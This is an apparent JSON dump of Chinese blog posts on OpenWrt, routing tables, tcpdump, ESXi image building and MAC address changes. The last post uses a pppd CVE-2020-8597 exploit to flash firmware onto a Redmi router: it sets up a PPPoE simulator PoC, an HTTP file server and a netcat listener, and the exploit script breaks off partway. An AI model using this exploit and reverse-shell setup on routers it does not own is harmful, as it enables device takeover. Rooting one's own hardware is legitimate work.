服务，则可以修改/etc/config/network： 1234config interface &apos;swlan&apos; option proto &apos;dhcp&apos; option type &apos;bridge&apos; option ifname &apos;lan2 lan3&apos; 比如，在上面我设置了连接到 lan2 和 lan3的设备也位于 swlan中。这样以后，通过 lan2 或者 lan3 有线端口连接到Openwrt路由器的设备也由上一级路由器（在上图中，是192.168.1.1）来提供 NAT 和 DHCP 服务。 管理 OpenWrt想要增加管理口，就要让br-lan有个特殊的地址，PC直接接入lan口，设置pc的ip为静态，并设置与ap相同的子网掩码 就可以让PC直接访问AP的管理界面 在/etc/config/network中添加alias 123456789101112131415161718192021222324252627282930root@openwrt:/etc/config# cat network config interface &apos;loopback&apos; option ifname &apos;lo&apos; option proto &apos;static&apos; option ipaddr &apos;127.0.0.1&apos; option netmask &apos;255.0.0.0&apos; config interface &apos;lan&apos; option ifname &apos;eth2.1&apos; option type &apos;bridge&apos; option proto &apos;dhcp&apos; #option ipaddr &apos;192.168.0.121&apos; #option netmask &apos;255.255.255.0&apos; #option gateway &apos;192.168.0.1&apos; #option dns &apos;192.168.0.1&apos; option macaddr &apos;00:01:42:60:3d:3c&apos; config interface &apos;wan&apos; option ifname &apos;eth2.2&apos; option proto &apos;dhcp&apos; option macaddr &apos;00:01:42:60:3d:3d&apos; config &apos;alias&apos; ###添加br-lan的second ip option &apos;interface&apos; &apos;lan&apos; option &apos;proto&apos; &apos;static&apos; option &apos;ipaddr&apos; &apos;10.0.0.7&apos; option &apos;netmask&apos; &apos;255.255.255.0&apos;root@openwrt:/etc/config# 将pc的ip设置为10.0.0.100，子网掩码为255.255.255.0，就可以直接访问http://10.0.0.7进入ap的管理界面了！ 为了防止内网中也有同样的地址，可以添加多个alias，防止出现冲突现象，不过也不用多虑，因为当你要进入管理界面时需要连网线插入lan口，而ap一般都只有一个网口，所以也就不会有冲突。 路由AP混合模式（Routed AP） https://oldwiki.archive.openwrt.org/doc/recipes/routedap 纯AP模式（Dumb AP）http://wiki.openwrt.org/doc/recipes/dumbap Reference https://oldwiki.archive.openwrt.org/doc/networking/network.interfaces https://oldwiki.archive.openwrt.org/doc/uci/network/switch https://openwrt.org/zh-cn/doc/uci/network https://oldwiki.archive.openwrt.org/doc/recipes/bridgedap http://einverne.github.io/post/2017/03/openwrt-settings-and-tips.htmlde https://www.openwrtdl.com/wordpress/openwrt%E4%B8%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84ap%E6%A8%A1%E5%BC%8F","comments":true,"categories":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/categories/OpenWrt/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/tags/OpenWrt/"}]},{"title":"【Network】路由（Route）","date":"2020-06-27T10:52:52.000Z","path":"2020/06/27/【Network】路由/","text":"Simple Case我们先看一种最简单的情况，两台设备在一个VLAN内，他们都连接了一个Router，并进行 TCP 通讯： 我们假设PC2后于 PC1 连接Router。在PC2连接时，会（向当前网段内所有主机）进行ARP广播： 这样各个设备就获得了 PC2 MAC 地址和 IP地址的关系，同时，PC2也获得了其他设备的 MAC 地址和 IP地址的关系。 当 PC2 连接前，PC1中的ARP表： 123$ arp -aopenwrt.lan (192.168.1.1) at 88:c3:97:9b:51:60 on en8 ifscope [ethernet]weishi-mac.lan (192.168.1.173) at 0:e0:4c:6a:56:1b on en8 ifscope permanent [ethernet] 当PC2 连接后： 1234$ arp -aopenwrt.lan (192.168.1.1) at 88:c3:97:9b:51:60 on en8 ifscope [ethernet]weishi-mac.lan (192.168.1.173) at 0:e0:4c:6a:56:1b on en8 ifscope permanent [ethernet]weis-mbp-2.lan (192.168.1.227) at 8c:85:90:24:c7:dd on en8 ifscope [ethernet] 路由器（Route）路由器（Router）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。 路由器、交换机（Switch）和集线器（Hub）路由器与交换机的差别，路由器是属于OSI第三层的产品，交換机是OSI第二层的产品。 第二层（交換机）的产品功能在于，将网络上各个电脑的MAC地址记在MAC地址表中，当局域网中的电脑要经过交換机去交换传递数据时，就查询交換机上的MAC地址表中的信息，将数据包发送给指定的电脑，而不会像第一层的产品（如集线器）每台在网络中的电脑都发送。 而路由器除了有交換机的功能外，更拥有路由表作为发送数据包时的依据，在有多种选择的路径中选择最佳的路径。此外，并可以连接两个以上不同网段的网络，而交換机只能连接两个。并具有IP分享的功能，如：区分哪些数据包是要发送至WAN。路由表存储了（向前往）某一网络的最佳路径，该路径的“路由度量值”以及下一个（跳路由器）。参考条目路由获得这个过程的详细描述。 路由表（Routing Table）在计算机网络中，路由表（routing table）或称路由择域信息库（RIB, Routing Information Base），是一个存储在路由器或者联网计算机中的电子表格（文件）或类数据库。路由表存储着指向特定网络地址的路径（在有些情况下，还记录有路径的路由度量值）。路由表中含有网络周边的拓扑信息。路由表创建的主要目标是为了实现路由协议和静态路由选择。 123456$ routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Ifacedefault 192.168.2.1 0.0.0.0 UG 0 0 0 wan192.168.1.0 * 255.255.255.0 U 0 0 0 br-lan192.168.2.0 * 255.255.255.0 U 0 0 0 wan 各列字段说明： 列 含义 Destination 目标网络段（如192.168.1.0 就表示 192.168.1.0）或目标主机。Destination 为 default（0.0.0.0）时，表示这个是默认网关，所有未在路由表中声明的流量都会发到这个网关（这里是 192.168.19.1） Gateway 网关地址，0.0.0.0 （或 *）表示当前记录对应的 Destination 跟本机在同一个网段，因此通信时不需要经过网关 Genmask Destination 字段的网络掩码，当Destination 是主机时，Genmask为 255.255.255.255，是默认路由时（即 Destination 为 default 时）会设置为 0.0.0.0 Flags 标记，含义参考表格后面的解释 Metric 路由距离，到达指定网络所需的中转数，是大型局域网和广域网设置所必需的 （不在Linux内核中使用。） Ref 路由项引用次数 （不在Linux内核中使用，恒为0） Use 该路由被使用的次数，可以粗略估计通向指定网络地址的网络流量。 Iface 网络接口名字，例如 eth0 ​ Flags 含义： U ：表示该路由是活跃的，因此可以被使用 H ：表示目标是一个主机（而不是一个网络段） 如果没有设置H标志，说明 Destination 是一个网络段（主机号部分为0）。 当为某个目的IP地址搜索路由表时，主机地址项必须与目的地址完全匹配，而网络地址项只需要匹配目的地址的网络号和子网号就可以了。 G ：表示需要经过网关 如果没有设置该标志，说明目的地是直接相连的。标志G是非常重要的，因为它区分了间接路由和直接路由（对于直接路由来说是不设置标志G的） R ：恢复动态路由产生的表项 D ：表示该路由是由重定向报文创建的。 M：表示该路由已被重定向报文修改。 ! ：表示拒绝路由 Linux 内核的路由种类主机路由（Flag -&gt; H）路由表中指向单个 IP 地址或主机名的路由记录，其 Flags 字段为 H。下面示例中，表示对于目的地为 10.0.0.10 这个主机的流量，路由到网关 10.139.128.1 （包含 G 说明需要经过网关，如果不包含 G ，则说明不需要经过网关，这意味着 eth0 interface 与该目的地主机直接相连）： 12345$ route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface10.0.0.10 10.139.128.1 255.255.255.255 UGH 0 0 0 eth0... 网络路由（Destination）表示路由到一个网络段（通常包含多个主机）。下面示例中，对于目的地为 10.0.0.0/24 这个网络的流量，路由到网关 10.139.128.1 ： 1234$ route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface10.0.0.0 10.139.128.1 255.255.255.0 UG 0 0 0 eth0 默认路由当目标主机的 IP 地址或网络不在路由表中时，数据包就被路由到默认路由（默认网关）。默认路由的 Destination 是 default 或 0.0.0.0。 1234$ routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Ifacedefault gateway 0.0.0.0 UG 0 0 0 eth0 路由类型下表显示了不同的路由类型，以及各个路由类型分别最适用于哪种网络方案。 路由类型 最适用于 静态 小型网络、从缺省路由器获取其路由的主机，以及仅需要知晓接下来几个跃点上一个或两个路由器的缺省路由器。 动态 较大的互联网络、具有多个主机的本地网络中的路由器以及大型自治系统上的主机。动态路由是大多数网络中系统的最佳选择。 组合的静态和动态路由 将静态路由网络和动态路由网络连接在一起的路由器，以及将内部自治系统与外部网络连接在一起的边界路由器。将系统上的静态路由和动态路由组合在一起是一种常见的做法。 Reference man route https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8 https://docs.oracle.com/cd/E19253-01/819-7058/gdyen/index.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【macOS】移除默认输入法","date":"2020-06-27T10:36:26.000Z","path":"2020/06/27/【macOS】移除默认输入法/","text":"关闭 macOS 的 SIP 将输入法切换为系统自带的 ABC 输入法，然后打开终端输入以下命令： 1$ sudo open ~/Library/Preferences/com.apple.HIToolbox.plist 以打开 com.apple.HIToolbox.plist 文件（打开 .plist 文件需要安装有如 Xcode） 依次点开 Root - AppleEnabledInputSources ，会看到一列 item ，找到其中 KeyboardLayout Name 为 ABC 的那一列，将整列 item 删掉，然后 command + S 保存。 接着重启电脑，打开键盘设置，就可以看到系统自带的 ABC 输入法已经被删掉了。 Reference https://www.jianshu.com/p/0ba1292441b9 ​ ​","comments":true,"categories":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/categories/macOS/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"}]},{"title":"【Network】NAT","date":"2020-06-27T10:29:51.000Z","path":"2020/06/27/【Network】NAT/","text":"","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Vmware】安装 VMware EXSI 6.7","date":"2020-06-27T03:26:37.000Z","path":"2020/06/27/【Vmware】安装-VMware-EXSI-6-7/","text":"Downloadiso从 https://my.vmware.com/en/web/vmware/downloads/info/slug/datacenter_cloud_infrastructure/vmware_vsphere/6_7 下载 VMware ESXi 6.7 U3b Offline Bundle 版本： ESXi-Customizer-PS因为我用的是USB3.0 网卡，所以需要下载相关驱动，否则会出现 No network adapters were detected 的错误。 ESXi-Customizer-PS脚本地址：https://www.v-front.de/p/esxi-customizer-ps.html 我使用的版本：http://vibsdepot.v-front.de/tools/ESXi-Customizer-PS-v2.6.0.ps1 USB3.0 网卡驱动从 https://flings.vmware.com/usb-network-native-driver-for-esxi 下载 USB3.0 网卡驱动（绿联 AX88179）。 下载地址：https://flings.vmware.com/usb-network-native-driver-for-esxi?download_url=https%3A%2F%2Fdownload3.vmware.com%2Fsoftware%2Fvmw-tools%2FUSBNND%2FESXi700-VMKUSB-NIC-FLING-34491022-component-15873236.zip 其他网卡的驱动（非USB）：https://vibsdepot.v-front.de/wiki/index.php/List_of_currently_available_ESXi_packages 把 .zip 解压，并把 .vib 放到 vib 文件夹中： 老网卡驱动默认情况VMware EXSI.ISO包含了大量服务器驱动，但有部分网卡驱动未集成到VMware EXSI.ISO，例如：瑞昱（Realtek）网卡驱动等。 拿到网卡型号： 去 https://vibsdepot.v-front.de/wiki/index.php?search=10EC%3A8136&amp;title=Special%3ASearch&amp;go=Go 中搜索。 可惜！这个驱动（https://vibsdepot.v-front.de/wiki/index.php/Net-r8101）不支持EXSi 6.5 版本。 VMware PowerCLI下载 VMware PowerCLI ：https://my.vmware.com/cn/group/vmware/downloads/details?productId=614&amp;downloadGroup=PCLI650R1 12Set-ExecutionPolicy RemoteSignedSet-ExecutionPolicy Unrestricted 安装 VMware PowerCLI。 封装相关驱动到ESXi镜像包以管理员身份运行 VMware PowerCLI，并进行重打包： 1.\\ESXi-Customizer-PS-v2.6.0.ps1 -izip .\\ESXi670-201912001.zip -pkgDir .\\vib 详细参数：https://www.v-front.de/p/esxi-customizer-ps.html#download ![Image 3](assets/Image 3.png) 下载iso后，写到U盘中（在Windows中可以使用 rufus）。 从U盘启动。 网卡直通Reference https://www.bilibili.com/read/cv3854515/ https://www.virtuallyghetto.com/2016/11/usb-3-0-ethernet-adapter-nic-driver-for-esxi-6-5.html","comments":true,"categories":[{"name":"Vmware","slug":"Vmware","permalink":"http://swsmile.info/categories/Vmware/"}],"tags":[{"name":"Vmware","slug":"Vmware","permalink":"http://swsmile.info/tags/Vmware/"}]},{"title":"【OpenWrt】查看 CPU 温度","date":"2020-06-21T04:12:49.000Z","path":"2020/06/21/【OpenWrt】查看CPU温度/","text":"1$ cut -c1-2 /sys/class/thermal/thermal_zone0/temp","comments":true,"categories":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/categories/OpenWrt/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/tags/OpenWrt/"}]},{"title":"【Network】tcpdump 抓包","date":"2020-06-20T14:04:20.000Z","path":"2020/06/20/【Network】tcpdump-抓包/","text":"Usage默认启动1$ tcpdump 普通情况下，直接启动tcpdump将监视第一个网络接口上所有流过的数据包。 监视指定网络接口的数据包1$ tcpdump -i eth1 如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。 监视指定主机的数据包打印所有进入或离开sundown的数据包 1$ tcpdump host sundown 也可以指定ip，例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包 1$ tcpdump host 210.27.48.1 截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信 1$ tcpdump host 210.27.48.1 and \\ (210.27.48.2 or 210.27.48.3 \\) 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令： 1$ tcpdump ip host 210.27.48.1 and ! 210.27.48.2 监视指定主机和端口的数据包如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令 1$ tcpdump tcp port 23 and host 210.27.48.1 对本机的udp 123 端口进行监视 123 为ntp的服务端口 1$ tcpdump udp port 123 tcpdump 与WiresharkWireshark是一个非常简单易用的抓包工具。但在Linux下很难找到一个好用的图形化抓包工具。 还好有tcpdump。我们可以用Tcpdump + Wireshark 的完美组合实现：在 Linux 里抓包，然后在Wireshark 里分析包。 1$ tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型 -i eth1 : 只抓经过接口eth1的包 (3)-t : 不显示时间戳 (4)-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包 (5)-c 100 : 只抓取100个数据包 (6)dst port ! 22 : 不抓取目标端口是22的数据包 (7)src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24 (8)-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Linux】修改 MAC 地址","date":"2020-06-20T13:18:40.000Z","path":"2020/06/20/【Linux】操作-修改-MAC-地址/","text":"Linux获取mac地址123$ ip link showenp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000 link/ether 08:xx:xx:xx:xx:x1 brd ff:ff:ff:ff:ff:ff 或者： 12$ ifconfig | grep HWaddrenp0s3 Link encap:Ethernet HWaddr 08:xx:xx:xx:xx:x1 修改mac地址Temporary ModificationifconfigThis involves taking the network interface down, running a command to change its MAC address, and then bringing it back up. Be sure to replace “eth0” with the name of the network interface you want to modify and enter the MAC address of your choice: 1234567$ sudo ifconfig eth0 down$ sudo ifconfig eth0 hw ether xx:xx:xx:xx:xx:xx$ sudo ifconfig eth0 up$ ifconfig eth0 | grep HWaddr As on Linux, this change is temporary and will be reset when you next reboot. You’ll need to use a script that automatically runs this command on boot if you’d like to permanently change your Mac address. ip1234567891011# First, turn off the Network card using command:$ sudo ip link set dev [interface] down# Next, set the new MAC is using command:$ sudo ip link set dev [interface] address XX:XX:XX:XX:XX:XX# Finally, turn it on back with command:$ sudo ip link set dev [interface] up# Now, verify new MAC id using command:$ ip link show [interface] Permanent Modificationmacchanger123$ macchanger -m 32:ce:cb:3c:63:cd [interface]$ ip link show eth0 macOSRun the following command, replacing en0 with your network interface’s name and filling in your own MAC address: 1$ sudo ifconfig en0 xx:xx:xx:xx:xx:xx The network interface will generally be either en0 or en1 , depending on whether you want to configure a Mac’s Wi-Fi or Ethernet interface. Run the ifconfig command to see a list of interfaces if you’re not sure of the appropriate network interface’s name. Reference https://www.howtogeek.com/192173/how-and-why-to-change-your-mac-address-on-windows-linux-and-mac/ https://www.ostechnix.com/change-mac-address-linux/","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】查看网络信息","date":"2020-06-20T13:12:06.000Z","path":"2020/06/20/【Linux】查看网络信息/","text":"查看 arp 表1234567891011$ arp -aopenwrt.lan (192.168.19.1) at 88:c3:dd:cc:bb:aa on en8 ifscope [ethernet]weishi-mac.lan (192.168.19.173) at 0:e0:aa:bb:cc:dd on en8 ifscope permanent [ethernet]nishiinhinoipad.lan (192.168.19.202) at 74:81:11:22:33:c on en8 ifscope [ethernet]iphone.lan (192.168.19.206) at 94:c:aa:bb:cc:dd on en8 ifscope [ethernet]? (192.168.19.255) at ff:ff:ff:ff:ff:ff on en8 ifscope [ethernet]? (224.0.0.251) at 1:0:aa:0:0:fb on en8 ifscope permanent [ethernet]? (239.255.255.250) at 1:0:bb:cc:dd:fa on en8 ifscope permanent [ethernet]# 清空ARP表$ sudo arp -ad 查看路由表123456$ routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Ifacedefault 192.168.19.1 0.0.0.0 UG 0 0 0 wan192.168.1.0 * 255.255.255.0 U 0 0 0 br-lan192.168.19.0 * 255.255.255.0 U 0 0 0 wan 各列字段说明： 列 含义 Destination 目标网络段（如192.168.1.0 就表示 192.168.1.0）或目标主机。Destination 为 default（0.0.0.0）时，表示这个是默认网关，所有未在路由表中声明的流量都会发到这个网关（这里是 192.168.19.1） Gateway 网关地址，0.0.0.0 （或 *）表示当前记录对应的 Destination 跟本机在同一个网段，通信时不需要经过网关 Genmask Destination 字段的网络掩码，当Destination 是主机时，Genmask为 255.255.255.255，是默认路由时（即 Destination 为 default 时）会设置为 0.0.0.0 Flags 标记，含义参考表格后面的解释 Metric 路由距离，到达指定网络所需的中转数，是大型局域网和广域网设置所必需的 （不在Linux内核中使用。） Ref 路由项引用次数 （不在Linux内核中使用，恒为0） Use 该路由被使用的次数，可以粗略估计通向指定网络地址的网络流量。 Iface 网络接口名字，例如 eth0 ​ Flags 含义： U ：表示该路由是活跃的，因此可以被使用 H ：表示目标是一个主机（而不是一个网络段） 如果没有设置H标志，说明 Destination 是一个网络段（主机号部分为0）。 当为某个目的IP地址搜索路由表时，主机地址项必须与目的地址完全匹配，而网络地址项只需要匹配目的地址的网络号和子网号就可以了。 G ：表示需要经过网关 如果没有设置该标志，说明目的地是直接相连的。标志G是非常重要的，因为它区分了间接路由和直接路由（对于直接路由来说是不设置标志G的） R ：恢复动态路由产生的表项 D ：表示该路由是由重定向报文创建的。 M：表示该路由已被重定向报文修改。 ! ：表示拒绝路由 Linux 内核的路由种类主机路由路由表中指向单个 IP 地址或主机名的路由记录，其 Flags 字段为 H。下面示例中，对于目的地为 10.0.0.10 这个主机的流量，路由到网关 10.139.128.1 ： 12345$ route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface10.0.0.10 10.139.128.1 255.255.255.255 UGH 0 0 0 eth0... 网络路由主机可以到达的网络。下面示例中，对于目的地为 10.0.0.0/24 这个网络的流量，路由到网关 10.139.128.1 ： 1234$ route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface10.0.0.0 10.139.128.1 255.255.255.0 UG 0 0 0 eth0 默认路由当目标主机的 IP 地址或网络不在路由表中时，数据包就被路由到默认路由（默认网关）。默认路由的 Destination 是 default 或 0.0.0.0。 1234$ routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Ifacedefault gateway 0.0.0.0 UG 0 0 0 eth0 macOS下查看路由表12345678910111213141516171819202122232425262728293031$ netstat -rnRouting tablesInternet:Destination Gateway Flags Netif Expiredefault 192.168.1.1 UGSc en8127 127.0.0.1 UCS lo0127.0.0.1 127.0.0.1 UH lo0169.254 link#11 UCS en8 !169.254 link#10 UCSI en0 !169.254.230.197/32 link#10 UCS en0 !169.254.255.255 link#11 UHLSW en8 !192.168.1 link#11 UCS en8 !192.168.1.1/32 link#11 UCS en8 !192.168.1.1 88:c3:97:9b:51:60 UHLWIir en8 1197192.168.1.173/32 link#11 UCS en8 !192.168.1.173 0:e0:4c:6a:56:1b UHLWI lo0192.168.1.227 8c:85:90:24:c7:dd UHLWIi en8 470192.168.1.255 ff:ff:ff:ff:ff:ff UHLWbI en8 !# Or$ arp -nlaNeighbor Linklayer Address Expire(O) Expire(I) Netif Refs Prbs169.254.255.255 (incomplete) (none) (none) en8192.168.1.1 88:c3:97:9b:51:60 1m36s 1m29s en8 1192.168.1.173 0:e0:4c:6a:56:1b (none) (none) en8192.168.1.227 8c:85:90:24:c7:dd 2m15s 2m16s en8 1192.168.1.255 ff:ff:ff:ff:ff:ff (none) (none) en8224.0.0.251 1:0:5e:0:0:fb (none) (none) en8239.255.255.250 1:0:5e:7f:ff:fa (none) (none) en0239.255.255.250 1:0:5e:7f:ff:fa (none) (none) en8 Reference https://www.cyberciti.biz/faq/linux-list-network-interfaces-names-command/","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】查看网络接口（Network Interface）","date":"2020-06-20T13:04:44.000Z","path":"2020/06/20/【Linux】查看网络接口/","text":"netstatType the following command: 12345678$ netstat -iKernel Interface tableIface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flgeth0 1500 0 2697347 0 0 0 2630262 0 0 0 BMRUlo 16436 0 2840 0 0 0 2840 0 0 0 LRUppp0 1496 0 102800 0 0 0 63437 0 0 0 MOPRUvmnet1 1500 0 0 0 0 0 49 0 0 0 BMRUvmnet8 1500 0 0 0 0 0 49 0 0 0 BMRU ifconfig1234567891011121314151617181920212223242526272829303132333435363738394041424344$ ifconfig -aeth0 Link encap:Ethernet HWaddr b8:ac:6f:65:31:e5 inet addr:192.168.2.100 Bcast:192.168.2.255 Mask:255.255.255.0 inet6 addr: fe80::baac:6fff:fe65:31e5/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:2697529 errors:0 dropped:0 overruns:0 frame:0 TX packets:2630541 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:2159382827 (2.0 GiB) TX bytes:1389552776 (1.2 GiB) Interrupt:17 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:2849 errors:0 dropped:0 overruns:0 frame:0 TX packets:2849 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2778290 (2.6 MiB) TX bytes:2778290 (2.6 MiB) ppp0 Link encap:Point-to-Point Protocol inet addr:10.1.3.105 P-t-P:10.0.31.18 Mask:255.255.255.255 UP POINTOPOINT RUNNING NOARP MULTICAST MTU:1496 Metric:1 RX packets:102800 errors:0 dropped:0 overruns:0 frame:0 TX packets:63437 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:3 RX bytes:148532544 (141.6 MiB) TX bytes:4425518 (4.2 MiB) vmnet1 Link encap:Ethernet HWaddr 00:50:56:c0:00:01 inet addr:192.168.47.1 Bcast:192.168.47.255 Mask:255.255.255.0 inet6 addr: fe80::250:56ff:fec0:1/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:49 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) vmnet8 Link encap:Ethernet HWaddr 00:50:56:c0:00:08 inet addr:172.16.232.1 Bcast:172.16.232.255 Mask:255.255.255.0 inet6 addr: fe80::250:56ff:fec0:8/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:49 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) ipThe ‘ifconfig’ command is deprecated in the latest Linux versions. So you can use ‘ip’ command to display the network interfaces as shown below. 12345678$ ip link showlo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00enp5s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 24:b6:fd:37:8b:29 brd ff:ff:ff:ff:ff:ffwlp9s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DORMANT group default qlen 1000 link/ether c0:18:85:50:47:4f brd ff:ff:ff:ff:ff:ff$ ip -s link 在mac 下123$ brew install iproute2mac$ ip link show$ ip -s link Reference https://www.cyberciti.biz/faq/linux-list-network-interfaces-names-command/","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【OpenWrt】MacOS 下红米路由器 AC2100 刷 OpenWrt","date":"2020-06-20T01:30:38.000Z","path":"2020/06/20/【OpenWrt】红米路由器-AC2100-刷-OpenWrt/","text":"Preparation相关工具安装12$ brew install netcat$ pip3 install scapy 下载 busybox 和固件123$ wget https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel -o busybox-mipsel$ wget https://downloads.openwrt.org/snapshots/targets/ramips/mt7621/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin -o openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin$ wget https://downloads.openwrt.org/snapshots/targets/ramips/mt7621/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin -o openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin ExploitPPPoE simulator12$ git clone git@github.com:Percy233/PPPoE_Simulator-for-RM2100-exploit.git$ cd PPPoE_Simulator-for-RM2100-exploit 12345678# Based on a PoC by \"WinMin\" (https://github.com/WinMin/CVE-2020-8597)from scapy.all import *from socket import *# 修改这里为在你的情况中使用的 interfaceinterface = \"en8\"... 12$ python3 PPPoE_Simulator.pyWaiting for packets 线缆连接 准备两条网线 一条的一端连接路由器的WAN口，另一端连接LAN1口 另一条的一端连接任何一个LAN口，另一端连接mac 设置本机为静态IP 设置路由器为PPPoE模式 http://192.168.31.1 - 【常用设置】 - 【上网设置】- 设置为PPPoE 与 PPPoE_Simulator.py 正常通讯在设置完成后，就能看到本机能与路由器进行PPPoE通讯了： 1234567891011121314$ python3 PPPoE_Simulator.pyWaiting for packetsServer-&gt;Client | Configuration Request (PAP)Client-&gt;Server | Discovery InitiationServer-&gt;Client | Discovery OfferClient-&gt;Server | Discovery RequestServer-&gt;Client | Discovery Session-confirmationServer-&gt;Client | Configuration Request (PAP)Client-&gt;Server | Discovery InitiationServer-&gt;Client | Discovery OfferClient-&gt;Server | Discovery RequestServer-&gt;Client | Discovery Session-confirmationServer-&gt;Client | Configuration Request (PAP)... 启动HTTP Server 以共享busybox和固件到路由器1$ python -m SimpleHTTPServer 启动 netcat1$ netcat -nvlp 31337 Exploit script - pppd-cve.py记得要修改下面的 interface 为在你的情况中使用的 interface： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184from scapy.all import *from scapy.layers.ppp import *# In most cases you just have to change this:# 记得要修改这里为在你的情况中使用的 interfaceinterface = \"en8\"ac_name = \"PPPoE-Simulator\"service_name = \"pppoe_on_macbook\"magic_number = 0xDEADBEEFhost_uniq = session_id = ac_cookie = mac_router = mac_server = eth_discovery = eth_session = Noneident = 0End_Of_List = 0x0000Service_Name = 0x0101AC_Name = 0x0102Host_Uniq = 0x0103AC_Cookie = 0x0104Vendor_Specific = 0x0105Relay_Session_Id = 0x0110Service_Name_Error = 0x0201AC_System_Error = 0x0202Generic_Error = 0x0203PADI = 0x09PADO = 0x07PADR = 0x19PADS = 0x65PADT = 0xa7LCP = 0xc021PAP = 0xc023CHAP = 0xc223IPCP = 0x8021IPV6CP = 0x8057PPPoE_Discovery = 0x8863PPPoE_Session = 0x8864Configure_Request = 1Configure_Ack = 2Authenticate_Ack = 2Configure_Nak = 3Configure_Reject = 4Terminate_Request = 5Terminate_Ack = 6Code_Reject = 7Protocol_Reject 